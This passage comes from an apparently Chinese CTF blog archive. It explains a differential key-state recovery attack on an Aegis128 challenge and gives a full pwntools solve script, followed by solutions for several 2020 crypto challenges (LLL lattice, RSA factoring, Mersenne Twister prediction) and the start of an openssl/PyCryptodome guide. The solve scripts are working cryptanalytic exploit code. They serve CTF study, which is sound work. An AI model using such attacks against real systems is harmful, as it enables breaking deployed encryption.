te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) s = _block_from_ints([t0, t1, t2, t3]) return _xor(s, round_key) te0[s[0]],te1[s[1]]这些就相当于是s盒，按照s0,s5,s10,s15这种顺序取值相当于是行位移(shift)，取值进行异或就相当于是列混淆(mix_column)。整个过程我们大致写下来就是:\nAES(m) = mix_column(shift(Sbox(m))) 实际上就是AES加密算法中，除去密钥交换这一步之后的剩余步骤。并且我们知道，整个Aegis加密中，AES参与的方式为:\nif j != 0\rS[i+1][j] = AES(S[i][(j+4)%5])\relse\rS[i+1][j] = AES(S[i][(j+4)%5]) ^ mi 于是我们可以简写成如下的运算:\nif j != 0\rC = AES(M)\relse\rC = AES(M)^m 那假设此时，我们的M发生了一些变化，我们这里将变化的差值写作dM，此时有\nM1 = M^dM 对M1的加密就可以写成:\nif j != 0\rC1 = AES(M1) = AES(M^dM)\relse\rC1 = AES(M1)^m = AES(M^dM)^m C1、C均为我们可以得到的具体值，如果我们能够通过控制加密的内容，使得dM可控（之后会展示）我们就有机会能够推导出M的值。具体的做法如下:\n1. 将C1^C，此时消除了m的影响，存在公式\rC1^C = AES(M^dM)^AES(M)\r2. AES = mix_column(shift(Sbox(m)))\r然而首先我们知道，mix_column本身也是异或运算得到的结果，也就是说满足\rmix_column(x)^mix_column(x^dx) = mix_column(dx)\r而shift只是位移操作，所以也可满足\rshift(x)^shift(x^dx) = shift(dx)\r所以实际上可以写作\rC1^C = AES(M^dM)^AES(M) = Sbox(M^dM)^Sbox(M) 然而实际上，Sbox运算是可以被爆破的。假设我们能知道dM，那我们只需要爆破16个字节，最终就能推导出M的值\nAegis的加密过程 # 由于Aegis128加密中的最小单位为128bit，也就是16字节，所以加密之前会将当前的明文填充至16的倍数。之后，每16个字节的加密手法如下:\nfor i in range(0, len16(msg), 16):\rCi = (S2 \u0026amp; S3) ^ S1 ^ S4 ^ mi\rSi+1 = StatusUpdate(Si, mi) 注意一个细节，这边为了防止S0的参与导致加密算法被利用，所以在加密过程中故意抛弃了S0。 加密结束之后，更新当前状态块。这里参考一个图可能会更加清晰:\np[i][0]`为我们按照16字节分组的第i组明文输入，`k[0][0]`表示第0组的明文加密得到的密文。这里注意，我们的明文的**第0组实际上参与了第一组密文的生成，并且还影响了第1组的状态**。图上的红框表示的就是，当我们的输入`p[0][0]`发生变化的时候，实际上会影响的状态。从图上可知，当输入`p[0][0]`变化的时候，实际上会影响的是:`s[1][0], s[2][0], s[2][1], k[2][0]（这个地方应该写作k[2]，可能是图片作者写错了） 参考源码：\ndef raw_encrypt(S, msg): ct_blocks = [] for i in range(0, len(msg), 16): blk = msg[i:i+16] mask = Aegis128.output_mask(S) if len(blk) \u0026lt; 16: mask = mask[:len(blk)] p = blk + bytes(16 - len(blk)) else: p = blk ct_blocks.append(_xor(mask, blk)) S = Aegis128.state_update(S, p) return S, b\u0026#39;\u0026#39;.join(ct_blocks) def encrypt(self, iv, ad, msg): S = self.initialize(iv) S = self.update_aad(S, ad) S, ct = self.raw_encrypt(S, msg) tag = self.finalize(S, len(ad) * 8, len(msg) * 8) return ct, tag Ageis的漏洞点 # 加密流程中，IV和key都不会更新，并且加密7次。最终目的是让我们求出当使用了空的aad进行了StateUpdate状态后得到的初始状态，也就是状态S[1]。 这一类IV、key不发生变化的题目，其实传达的一个含义就是加密算法本身是不变的，即是说对于加密算法C = F(m)，这个F是不变量，而此时的m和C都是已知的，就有机会构造合适的m，从而泄露F中的一些信息\n第一步泄露 # 这里重新展示一下之前用来描述加密的那张图，这里我们着重关注的是变化值:\n可以看到，当p[0][0]变化的时候，s[1][0], s[2][0], s[2][1], k[2]均会收到影响。这里我们复习一下这几个值的关系:\n（1）k[2] = (S[2][2] \u0026amp; S[2][3]) ^ S[2][1] ^ S[2][4] ^ p[2][0]\r（2）k[1] = (S[1][2] \u0026amp; S[1][3]) ^ S[1][1] ^ S[1][4] ^ p[1][0]\r（3）S[2][0] = AESRound(S[1][4])^S[1][0]^p[1][0]\r（4）S[1][0] = AESRound(S[0][4])^S[0][0]^p[0][0] 由于（2）我们可以知道，S[1][0]并不参与到整个加密过程中，所以不会对加密本身有影响，因此k[1]的值不发生变化 此时生成的密文kd[2]虽然发生了变化，但是其变化仅仅是因为S[2][1]发生了变化，因为在StateUpdate中，只有S[2][1]会受到输入的影响，其他的状态并不收到当前的输入状态影响: 这里我们将变化后的p写作dp，并且满足dtp = dp^p，发生了相应变化的变量都加上d的前缀，于是此时有：\nkd[2] ^ k[2] = S[2][1] ^ Sd[2][1] = AESRound(S[1][0])^AESRound(Sd[1][0]) 此时我们的kd[2] ^ k[2]是已知量。而我们此时知道\n（5）AESRound(S[1][0])^AESRound(Sd[1][0]) = Sbox(S[1][0])^Sbox(Sd[1][0])\r（6）S[1][0] = AES(S[0][4]) ^ S[0][0] ^ p[0][0] 由于（6）中，S[0][0], S[0][4]在IV和key不变的情况下，即使我们更改p也不会发生变化，所以实际上可以推出\n（7）Sd[1][0]^S[1][0] = p[0][0]^dp[0][0] = dtp[0][0]\r====\u0026gt; Sd[1][0] = S[1][0] ^ dtp[0][0] 于是我们可以将（5）推到成\n（8）Sbox(S[1][0])^Sbox(Sd[1][0]) = Sbox(S[1][0])^Sbox(S[1][0]^dpt[0][0]) = kd[2]^k[2] 在（8）这个算式中，dpt，kd，k三个值我们都知道，于是我们只需要爆破S[1][0]中的16字节即可。 不过经过测试，直接爆破是存在多解的情况，所以我们可以增加一个变化，也就是dpt2，两次的结果综合考虑。经过测试，这种方式能够得到唯一的S[1][0]\ndef resolve(dk_1, ds_1, dk_2, ds_2): # here we check the tmpk = aes.bytes2matrix(dk_1) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k1 = aes.matrix2bytes(tmpk) tmpk = aes.bytes2matrix(dk_2) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k2 = aes.matrix2bytes(tmpk) # result should be unique res = bytearray(16) # try to bruce it for i in range(16): x1 = set() for c in range(256): if aes.s_box[c] ^ aes.s_box[c^ds_1[i]] == d_k1[i] and aes.s_box[c] ^ aes.s_box[c^ds_2[i]] == d_k2[i]: x1.add(c) res[i] = x1.pop() assert(len(res) == 16) return bytes(res) 进一步泄露 # 由于我们有7次通信机会，目前可以如下安排\n第一次：我们一口气通信获得k[0],k[1],k[2],k[3],k[4]，此时我们可以将p设置为全0，这样的话能够帮助我们之后更加方便的进行计算 第二、三次： 得到S[1][0] 第四、五次： 得到S[2][0] 第六、七次： 得到S[3][0] 我们可以如法炮制，通过修改p[1][0],p[2][0]，得到S[2][0],S[3][0]。此时我们有公式:\n（3）S[2][0] = AESRound(S[1][4])^S[1][0]^p[1][0] ==\u0026gt; 直接逆运算，可得S[1][4]\r（9）S[3][0] = AESRound(S[2][4])^S[2][0]^p[2][0] ==\u0026gt; 利用之前的技巧，可得S[2][4]\r（10）S[2][4] = AESRound(S[1][3])^S[1][4] ==\u0026gt; 直接逆运算，可得S[1][3] 此时我们就有了S[1][0], S[1][3], S[1][4]，并且题目中泄露了S[1][2]，所以我们最终利用\n（11）C[1] = (S[2][0] \u0026amp; S[3][0]) ^ S[1][0] ^ S[4][0] ^ pt[0] 就能得到最后的S[1][1]，此时整个题泄露完成。\nimport aes import os import aegis from aegis import _xor,_and from pwn import * import base64 def R(x): tmp = aes.bytes2matrix(x) aes.sub_bytes(tmp) aes.shift_rows(tmp) aes.mix_columns(tmp) return aes.matrix2bytes(tmp) def invR(x3): tmp = aes.bytes2matrix(x3) aes.inv_mix_columns(tmp) aes.inv_shift_rows(tmp) aes.inv_sub_bytes(tmp) return aes.matrix2bytes(tmp) def resolve(dk_1, ds_1, dk_2, ds_2): # here we check the tmpk = aes.bytes2matrix(dk_1) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k1 = aes.matrix2bytes(tmpk) tmpk = aes.bytes2matrix(dk_2) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k2 = aes.matrix2bytes(tmpk) # result should be unique res = bytearray(16) # try to bruce it for i in range(16): x1 = set() for c in range(256): if aes.s_box[c] ^ aes.s_box[c^ds_1[i]] == d_k1[i] and aes.s_box[c] ^ aes.s_box[c^ds_2[i]] == d_k2[i]: x1.add(c) res[i] = x1.pop() assert(len(res) == 16) return bytes(res) def encrypt(ph, aad, pt): ph.sendline(base64.standard_b64encode(pt)) ph.sendline(base64.standard_b64encode(aad)) ct = ph.recvline(keepends=False) ct = base64.standard_b64decode(ct.decode(\u0026#39;utf-8\u0026#39;)) tag = ph.recvline(keepends=False) tag = base64.standard_b64decode(tag.decode(\u0026#39;utf-8\u0026#39;)) return ct, tag def decrypt(ph, aad, pt, index, ct): left_index = (index+1)*16 right_index = (index+2)*16 enc, tag = encrypt(ph, aad, pt[2*index-1]) # print(\u0026#34;enc[{}:{}]\u0026#34;.format(left_index/32,right_index/32)) # print(\u0026#34;pt[{}:{}]\u0026#34;.format(2*index-1, 2*index)) ct1_2 = enc[left_index:right_index] # encrypt 3 enc, tag = encrypt(ph, aad, pt[2*index]) # print(pt[2*index]) ct1_3 = enc[left_index:right_index] # decrypt s10 # print(ct) # print(ct1_2) # print(ct) # print(ct1_2) dk1 = _xor(ct,ct1_2) dk2 = _xor(ct,ct1_3) # split S1/S5 # pt split ,too s = resolve(dk1, pt[2*index-1][16*(index-1):16*(index)], dk2, pt[2*index][16*(index-1):16*(index)]) return s def localTest(): ph = remote(\u0026#34;127.0.0.1\u0026#34;,\u0026#39;10090\u0026#39;) pt = [] padding = b\u0026#39;\\x00\u0026#39;*16 p0 = b\u0026#39;\\x00\u0026#39;*16 p1 = b\u0026#39;\\x00\u0026#39;*16 p2 = b\u0026#39;\\x00\u0026#39;*16 pt.append(p0+p1+p2+padding*2) # for i in range(1,7): # pt.append(bytes([i%2+1]*16)+padding) # for s10 pt.append(bytes([1]*16)+padding+padding) pt.append(bytes([2]*16)+padding+padding) # for s20 pt.append(padding+bytes([1]*16)+padding+padding) pt.append(padding+bytes([2]*16)+padding+padding) # for s30 pt.append(padding+padding+bytes([1]*16)+padding*2) pt.append(padding+padding+bytes([2]*16)+padding*2) iv = ph.recvline(keepends=False) aad = b\u0026#39;\u0026#39; # encrypt 1 enc, tag = encrypt(ph, aad, pt[0]) print(enc) ct = [] for i in range(5): ct.append(enc[i*16:(i+1)*16]) s10 = decrypt(ph, aad, pt, 1, ct[2]) # decrypt 2 s20 = decrypt(ph, aad, pt, 2, ct[3]) # decrypt 3 s30 = decrypt(ph, aad, pt, 3, ct[4]) # s20 = s10 xor R(s14) ==\u0026gt; s14 = invR(s20 xor s10) s14 = invR(_xor(s20, s10)) # s30 = s20 xor R(s24) ==\u0026gt; s24 = invR(s20 xor s30) # s24 = s14 xor R(s13) ==\u0026gt; s13 = invR(s14 xor s24) s24 = invR(_xor(s20, s30)) s13 = invR(_xor(s24, s14)) ph.recvuntil(\u0026#34;Oops, something leak:\u0026#34;) s12 = ph.recvline(keepends=False) print(s12) s12 = base64.standard_b64decode(s12.decode(\u0026#39;utf-8\u0026#39;)) # if pt = 00 then enc1 = (s12\u0026amp;s13) xor s14 xor s11 # -\u0026gt; s11 = enc1 xor s14 xor (s12\u0026amp;s13) enc1 = enc[16:16*2] s11 = _xor(s14, _xor(enc1, _and(s12, s13))) # s15 = _xor(s12, _xor(enc12, _and(s16, s17))) s1 = s10+s11+s12+s13+s14 ph.sendline(base64.standard_b64encode(s1)) ph.interactive() if __name__ == \u0026#34;__main__\u0026#34;: localTest() 第五空间2020 有几个脚本可以偷 # secrets # 从算法中可知满足表达式 $c \\equiv a_0 x_1^2 x_2 + a_1 x_0 x_2^2 + a_2 x_1 x_2^2 \\mod p$\n由同余方程构造一个格子\n$$ [1,0,0,0,a0 * k]\\ [0,1,0,0,a1 * k]\\ [0,0,1,0,a2 * k]\\ [0,0,0,1,c * k]\\ [0,0,0,0,p * k] $$\n为满足LLL算法，k取$2^{32}$，最后即可求出系数secret\np = 11262096115235666933802384984690234504897820609940312496824079226002897675039978540501589954252280529685081417842844576044060586114527797910785935210841729\ra0=4466180910473361859350789459675556137864618617420328788169821212611803391878541909630693681804259240992086737964898776136917699083088117808235133334853043\ra1=4887981314308588962908319833576800643350454985421459983243096186706959103231201770635994519162313869702469523675537059237606426233167545218659189978781299\ra2=6222963447321263242047563972710956077055676498584240298712594187843704642795447140199703936008141098341496844773625746023752040758807620531632616610912213\re=[[0, 2, 1], [1, 0, 2], [0, 1, 2]]\rc = 2521258878430983025589687858541798401695147486882642972456698768540389939874205997047593688658001566287798373100962518354180078132561217455997908984321742\rk=1\u0026lt;\u0026lt;32\rA = Matrix(ZZ,[\r[1,0,0,0,a0*k],\r[0,1,0,0,a1*k],\r[0,0,1,0,a2 *k],\r[0,0,0,1,c *k],\r[0,0,0,0, p *k]\r])\rA.LLL()\rres =[3463832903,3041163877,2616200387]\rc = long_to_bytes(0x0497ca92dff6e21bf2882b100d29660e478a8322d06f2d759c07b7ac865d1090)\rkey = hashlib.sha256(str(res).encode()).digest()\raes = AES.new(key, AES.MODE_ECB)\rprint(b\u0026#39;flag{\u0026#39; +aes.decrypt(c) + b\u0026#39;}\u0026#39;) data_protect # encrypt1 直接分解n\nencrypt2 无法完全分解n，但是知道其中一个大素数因子，直接转化为 mod p下的rsa\nencrypt3 在Zmod(q) 下求解方程\nencrypt4 random的随机数预测，前面encrypt1有192bit，encrypt2有192bit，encrypt3中有612*32bit，刚好满足条件，可以预测出key\nencrypt5 继续随机数预测，可以预测出私钥x\nimport random\rfrom gmpy2 import *\rfrom Crypto.Util.number import *\rfrom Crypto.Cipher import AES\rfrom hashlib import sha256\rp=64390888389278700958517837593\rn=1428634580885297528425426676577388183501352157100030354079\rc=1019989333027273450782579103415892125563412519871045896869\rq=n//p\rd=invert(65537,(p-1)*(q-1))\rprint(long_to_bytes(pow(c,d,n)))\rc= 51342500906961408103258915228768275415740191204733837976903027942824981857691173079133834015102055031777401227355785897344053403243459544157687793960413113104670769220112095273635970933789525875595068985638845129357985043542698076902996316622632153857669586900278252852715534059153367015654872042990169865039\r# n=134949786048887319137407994803780389722367094355650515833817995038306119197600539524985448574053755793699799863164150565217726975197643634831307454431403854861515253009970594684699064052739820092115115614153962139870020206132705821506686959283747802946805730902605814619499301779892151365118901010526138311982\r# p = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997\r# q=n//p\r# # print()\r# print(q-p)\r# d=invert(65537,(p-1)*(q-1))\r# print(long_to_bytes(pow(c,d,n))[:-20])\r# a,b=(11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997,11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526563615762644)\r# print((b-a)==2**31-1)\r# b\u0026#39;XIAOming\u0026#39;\r# b\u0026#39;17810111101\u0026#39;\r# b\u0026#39;XIAOming@cmail.com\u0026#39;\rc=51342500906961408103258915228768275415740191204733837976903027942824981857691173079133834015102055031777401227355785897344053403243459544157687793960413113104670769220112095273635970933789525875595068985638845129357985043542698076902996316622632153857669586900278252852715534059153367015654872042990169865039\rn=134949786048887319137407994803780389722367094355650515833817995038306119197600539524985448574053755793699799863164150565217726975197643634831307454431403854861515253009970594684699064052739820092115115614153962139870020206132705821506686959283747802946805730902605814619499301779892151365118901010526138311982\rp = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997\rn=p\rd=invert(65537,(p-1))\rprint(long_to_bytes(pow(c,d,n))[:-20])\rq=5974434331\rkey=[[978955513, 2055248981, 3094004449, 411497641, 4183759491, 521276843, 1709604203, 3162773533, 2140722701, 782306144, 421964668, 356205891, 1039083484, 1911377875, 1661230549, 312742665, 3628868938, 2049082743], [3833871085, 2929837680, 2614720930, 4056572317, 3787185237, 93999422, 590001829, 429074138, 3012080235, 2336571108, 831707987, 3902814802, 2084593018, 316245361, 1799842819, 2908004545, 120773816, 2687194173], [3213409254, 3303290739, 742998950, 2956806179, 2834298174, 429260769, 769267967, 1301491642, 2415087532, 1055496090, 690922955, 2984201071, 3517649313, 3675968202, 3389582912, 2632941479, 186911789, 3547287806], [4149643988, 3811477370, 1269911228, 3709435333, 1868378108, 4173520248, 1573661708, 2161236830, 3266570322, 1611227993, 2539778863, 1857682940, 1020154001, 92386553, 3834719618, 3775070036, 3777877862, 2982256702], [4281981169, 2949541448, 4199819805, 3654041457, 3300163657, 1674155910, 1316779635, 66744534, 3804297626, 2709354730, 2460136415, 3983640368, 3801883586, 1068904857, 4178063279, 41067134, 752202632, 3143016757], [3078167402, 2059042200, 252404132, 415008428, 3611056424, 1674088343, 2460161645, 3311986519, 3130694755, 934254488, 898722917, 2865274835, 567507230, 1328871893, 3903457801, 2499893858, 492084315, 183531922], [3529830884, 4039243386, 233553719, 4118146471, 1646804655, 2089146092, 2156344320, 2329927228, 508323741, 1931822010, 579182891, 176447133, 597011120, 3261594914, 2845298788, 3759915972, 3095206232, 3638216860], [3352986415, 4264046847, 3829043620, 2530153481, 3421260080, 1669551722, 4240873925, 2101009682, 3660432232, 4224377588, 929767737, 3729104589, 2835310428, 1727139644, 1279995206, 1355353373, 2144225408, 1359399895], [3105965085, 818804468, 3230054412, 2646235709, 4053839846, 2878092923, 587905848, 1589383219, 2408577579, 880800518, 28758157, 1000513178, 2176168589, 187505579, 89151277, 1238795748, 8168714, 3501032027], [3473729699, 1900372653, 305029321, 2013273628, 1242655400, 4192234107, 2446737641, 1341412052, 304733944, 4174393908, 2563609353, 3623415321, 49954007, 3130983058, 425856087, 2331025419, 34423818, 2042901845], [1397571080, 1615456639, 1840339411, 220496996, 2042007444, 3681679342, 2306603996, 732207066, 663494719, 4092173669, 3034772067, 3807942919, 111475712, 2065672849, 3552535306, 138510326, 3757322399, 2394352747], [371953847, 3369229608, 1669129625, 168320777, 2375427503, 3449778616, 1977984006, 1543379950, 2293317896, 1239812206, 1198364787, 2465753450, 3739161320, 2502603029, 1528706460, 1488040470, 3387786864, 1864873515], [1356892529, 1662755536, 1623461302, 1925037502, 1878096790, 3682248450, 2359635297, 1558718627, 116402105, 3274502275, 2436185635, 771708011, 3484140889, 3264299013, 885210310, 4225779256, 363129056, 2488388413], [2636035482, 4140705532, 3187647213, 4009585502, 351132201, 2592096589, 3785703396, 750115519, 3632692007, 3936675924, 3635400895, 3257019719, 1928767495, 2868979203, 622850989, 3165580000, 4162276629, 4157491019], [1272163411, 1251211247, 357523138, 1233981097, 1855287284, 4079018167, 4028466297, 92214478, 4290550648, 648034817, 1247795256, 3928945157, 1199659871, 397659647, 3360313830, 561558927, 3446409788, 2727008359], [1470343419, 3861411785, 953425729, 65811127, 458070615, 1428470215, 3101427357, 1137845714, 1980562597, 4120983895, 45901583, 2869582150, 427949409, 3025588000, 3231450975, 3313818165, 4015642368, 3197557747], [2452385340, 111636796, 897282198, 4273652805, 1223518692, 3680320805, 2771040109, 3617506402, 3904690320, 77507239, 3010900929, 4099608062, 546322994, 1084929138, 902220733, 4054312795, 1977510945, 735973665], [3729015155, 3027108070, 1442633554, 1949455360, 2864504565, 3673543865, 446663703, 3515816196, 1468441462, 897770414, 2831043012, 707874506, 1098228471, 1225077381, 3622448809, 2409995597, 3847055008, 1887507220], [1839061542, 1963345926, 2600100988, 1703502633, 1824193082, 3595102755, 2558488861, 2440526309, 3909166109, 1611135411, 2809397519, 1019893656, 3281060225, 2387778214, 2460059811, 198824620, 1645102665, 865289621], [224442296, 3009601747, 3066701924, 1774879140, 880620935, 2676353545, 3748945463, 1994930827, 75275710, 3710375437, 4132497729, 3010711783, 3731895534, 2434590580, 3409701141, 2209951200, 995511645, 3571299495], [2337737600, 110982073, 2985129643, 1668549189, 3298468029, 698015588, 2945584297, 1036821195, 4249059927, 3384611421, 3304378629, 1307957989, 602821252, 184198726, 1182960059, 4200496073, 1562699893, 3320841302], [5866561, 2442649482, 479821282, 2687097642, 3347828225, 1876332308, 2704295851, 2952277070, 1803967244, 2837783916, 658984547, 3605604364, 1931924322, 3285319978, 556150900, 3795666798, 261321502, 1040433381], [3855222954, 3565522064, 1841853882, 1066304362, 3552076734, 3075952725, 2193242436, 2052898568, 2341179777, 3089412493, 165812889, 4196290126, 3568567671, 28097161, 2249543862, 1251207418, 522526590, 765541973], [1801734077, 2132230169, 667823776, 3900096345, 3119630138, 3620542178, 2900630754, 30811433, 608818254, 1040662178, 900811411, 3221833258, 43598995, 1818995893, 2718507668, 3445138445, 3217962572, 1437902734], [1812768224, 392114567, 2694519859, 1941199322, 2523549731, 2078453798, 851734499, 2376090593, 2069375610, 4084690114, 246441363, 4154699271, 58451971, 31806021, 4158724930, 2741293247, 3230803936, 2790505999], [3906342775, 2231570871, 1258998901, 1517292578, 162889239, 3130741176, 3925266771, 1780222960, 2378568279, 3873144834, 1597459529, 1581197809, 4101706041, 196019642, 1439141586, 587446072, 2012673288, 1280875335], [4058452685, 653145648, 553051697, 1406542226, 4053722203, 994470045, 2066358582, 3919235908, 2315900402, 3236350874, 172880690, 3104147616, 489606166, 3898059157, 200469827, 665789663, 3116633449, 4137295625], [1460624254, 4286673320, 2664109800, 1995979611, 4091742681, 2639530247, 4240681440, 2169059390, 1149325301, 3139578541, 2320870639, 3148999826, 4095173534, 2742698014, 3623896968, 2444601912, 1958855100, 1743268893], [2187625371, 3533912845, 29086928, 543325588, 4247300963, 1972139209, 272152499, 4276082595, 3680551759, 1835350157, 3921757922, 2716774439, 1070751202, 69990939, 3794506838, 699803423, 3699976889, 40791189], [539106994, 1670272368, 3483599225, 2867955550, 2207694005, 1126950203, 693920921, 2333328675, 539234245, 1961438796, 3126390464, 1118759587, 59715473, 1450076492, 4101732655, 3658733365, 940858890, 1262671744], [3092624332, 2175813516, 3355101899, 3657267135, 770650398, 359506155, 4149470178, 3763654751, 1184381886, 942048015, 523057971, 1098635956, 1732951811, 150067724, 2417766207, 4152571821, 2759971924, 4284842765], [3336022203, 2569311431, 2752777107, 1441977867, 1279003682, 3861567631, 1064716472, 3046493996, 1339401643, 39466446, 1464905290, 420733872, 2057911345, 2418624800, 2193625430, 1558527155, 4224908000, 207684355], [2681129718, 4210889596, 4051161171, 3131196482, 1128312875, 938670840, 2828563599, 3078146488, 1102989364, 3557724304, 156013303, 2371355565, 3608679353, 3513837899, 155622460, 396656112, 2493417457, 876296360], [3135876409, 181875076, 3662181650, 3851859805, 3626146919, 90441351, 1944988720, 585429580, 3158268550, 1399100291, 3688843295, 2851190, 2670576474, 3177735154, 3479499727, 197376977, 1790622954, 2393956089]]\rcipher=[595403492, 3329072201, 2030986893, 4171901788, 3978623752, 1983221945, 2446721844, 2357069183, 4157116254, 1084149362, 5164304343, 2285835942, 2562444158, 1580792970, 123176562, 878938066, 1581756453, 5868219323, 2039976783, 734750925, 1594241262, 4167440639, 3051132298, 657904326, 2869165250, 1240654684, 2667941558, 4488763635, 3975062760, 4362407867, 2329286887, 1929259095, 4743673673, 3503908479]\r#有限域下求线性方程 key*x=cipher 得到 x=[88,73,65,79,109,105,110,103,64,99,109,97,105,108,46,99,111,109]\rx=[88,73,65,79,109,105,110,103,64,99,109,97,105,108,46,99,111,109]\rfor i in x:\rprint(chr(i),end=\u0026#39;\u0026#39;)\rprint()\rfrom randcrack import RandCrack\rrc = RandCrack()\rt=[]\rfor i in key:\rfor j in i:\rt.append(j)\rp= 64390888389278700958517837593\rp_=64390888389278700958517837503\rq= 22186905890293167337018474103\rq_=22186905890293167337018474045\rpd=bytes_to_long(b\u0026#39;\\xf1\\x0f\\xb5\\xb5\\xae\\xf0\\x05\\x92BWR\\xd0\u0026gt;\\x91\\x0cv\\xbc ]\\x81\u0026#39;)\rd=1644175009\r# for qq in range(p_+1,p+1):\r# for pp in range(q_+1,q+1):\r# rc = RandCrack()\r# pp,qq=22186905890293167337018474101 ,64390888389278700958517837515\r# rc.submit(pp\u0026amp;0xffffffff)\r# rc.submit((pp\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\r# rc.submit((pp\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\r# rc.submit(qq\u0026amp;0xffffffff)\r# rc.submit((qq\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\r# rc.submit((qq\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\r# rc.submit(pd\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;96)\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;128)\u0026amp;0xffffffff)\r# rc.submit(d)\r# for i in range(612):\r# rc.submit(t[i])\r# r=0\r# for i in range(4):\r# tt=rc.predict_randrange(0, 4294967295)\r# r+=tt\u0026lt;\u0026lt;(32*i)\r# key = long_to_bytes(r)\r# a = AES.new(key,AES.MODE_ECB)\r# cipher = a.decrypt(long_to_bytes(206157860554052840058147052190501816262))\r# if(b\u0026#34;.\u0026#34; in cipher and b\u0026#34;_\u0026#34; in cipher):\r# print(pp,qq,cipher)\rrc = RandCrack()\rpp,qq=22186905890293167337018474101 ,64390888389278700958517837515\rrc.submit(pp\u0026amp;0xffffffff)\rrc.submit((pp\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\rrc.submit((pp\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\rrc.submit(qq\u0026amp;0xffffffff)\rrc.submit((qq\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\rrc.submit((qq\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\rrc.submit(pd\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;96)\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;128)\u0026amp;0xffffffff)\rrc.submit(d)\rfor i in range(612):\rrc.submit(t[i])\rr=0\rfor i in range(4):\rtt=rc.predict_randrange(0, 4294967295)\rr+=tt\u0026lt;\u0026lt;(32*i)\rr=0\rfor i in range(16):\rtt=rc.predict_randrange(0, 4294967295)\rr+=tt\u0026lt;\u0026lt;(32*i)\rr=0\rfor i in range(16):\rtt=rc.predict_randrange(0, 4294967295)\rr+=tt\u0026lt;\u0026lt;(32*i)\rq,g,h=12978641035734240236103271206089768414668942591886536148174561520305999709207251794343245618040094770557383475160630029074093741713376984903835480969208293, 8720814254745089777252083344348851268520692318828030452122549926748859741402125799736178655620806485161358327515735405190921467358304697344848268434382637 ,12099509832855805422212389412411496487421102553928260849593639134939000597394291986995380611893676422073382092596749292780050077552342507027413423034163272\rc1,c2=11037273227249384815270477914945574769214510988660737721762529999297862289189700923584519665480479763578699379894125409227652084419849423696932374103120058, 12087705792059361632307776684083188202195541184973623631541534293387150491895486080323457832843438088187773977539401538646693773152621936983533667985808470\rprint(long_to_bytes(invert(pow(c1,r,q),q)*c2%q)) ","date":"31 July 2021","permalink":"/achieve/%E5%9E%83%E5%9C%BE%E9%A2%98%E5%BD%92%E6%A1%A3/","section":"archive","summary":"","title":"垃圾题归档"},{"content":"\ropenssl基本使用指北 # 鉴于网上能找到的都写得像shit一样\n求人不如求己了属于是\nrsa # rsa pem密钥文件有 $n,p,q,dp,dq,e,d,[p^{-1}]_q$\n所有参数\n私钥\nopenssl rsa -in ./akey.pem -text 公钥\nopenssl rsa -in ./akey.pem -text -pubin 生成\nopenssl genrsa \u0026gt; key.pem openssl genrsa -out privkey.pem 2048 ecc # ec 密钥文件有参数\n曲线：$a,b,p,生成元G，阶数N$\n密钥：$私钥d，公钥P=d*G$\n提取\nopenssl ec -in ./p384-key.pem -text 提取csr证书 # openssl req -new -key privkey.pem -out ca.csr\n提取密钥信息 # 公私钥模数 # openssl rsa -in .\\pubkey.pem -pubout -modulus\nopenssl rsa -in .\\pubkey.pem -pubin -modulus\n提取所有信息 # openssl asn1parse -i -in privkey.pem\n公钥要指定偏移查看，bit string的偏移是19\nopenssl asn1parse -i -in .\\pubkey.pem -strparse 19\npem、der格式转化 # openssl rsa -in .\\private.pem -outform der -out .\\private.der\n除了生孩子什么都能干的python # crypto yyds\nfrom Crypto.PublicKey import RSA\n读取公钥信息 # rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(\u0026#34;n=%\\ne=%d\u0026#34;,n,e) 生成秘钥对文件 # rsa = RSA.generate(2048) public_key = rsa.publickey().exportKey() f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() private_key = rsa.exportKey() f = open(\u0026#34;private_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(private_key.decode()) f.close() 对文件加解密 # 载入填充方式\nfrom Crypto.Cipher import PKCS1_OAEP\nrsakey=RSA.importKey(open(\u0026#34;public_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) encrypt = rsa.encrypt(flag.encode()) rsakey=RSA.importKey(open(\u0026#34;private_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) decrypt = rsa.decrypt(f.read()) 生成 private_key.key # rsa_components = (n, e, int(d), p, 